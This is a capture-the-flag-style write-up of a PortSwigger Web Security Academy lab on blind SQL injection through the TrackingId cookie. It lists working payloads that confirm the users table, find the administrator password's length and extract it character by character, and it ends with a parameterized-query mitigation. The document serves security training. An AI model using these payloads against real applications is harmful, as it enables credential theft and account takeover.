## Blind SQL Injection with Conditional Responses

Platform: PortSwigger Web Security Academy  
Lab: Blind SQL injection with conditional responses

---

## Vulnerability Type
Blind SQL Injection (Conditional Responses)

---

## Description
The application is vulnerable to blind SQL injection via the TrackingId cookie. The vulnerability does not directly reveal database data in the response. Instead, information can be inferred by observing conditional differences in the application's behavior, specifically the presence or absence of a "Welcome back" message.

---

## Payloads Used

### Boolean condition testing

```sql
TrackingId=xyz' AND '1'='1
```

```sql
TrackingId=xyz' AND '1'='2
```

---

### Confirming the existence of the users table

```sql
TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
```

---

### Confirming the administrator user

```sql
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
```

---

### Determining password length

```sql
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
```

```sql
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>20)='a
```

---

### Extracting password characters using SUBSTRING and Burp Intruder

```sql
TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
```

The character position was incremented iteratively until the full password was reconstructed.

---

## Technical Impact
By leveraging conditional responses and automating requests with Burp Intruder, it was possible to infer sensitive data from the database without direct output. This allowed extraction of the administrator password character by character, resulting in full authentication bypass.

---

## Risk
An attacker could extract sensitive credentials without triggering visible errors or data leaks. This type of vulnerability is particularly dangerous because it can remain undetected while still allowing full account compromise.

---

## Mitigation
Use parameterized queries and prepared statements to prevent SQL injection. Avoid dynamically constructing SQL queries with user input and ensure consistent responses that do not reveal conditional behavior.
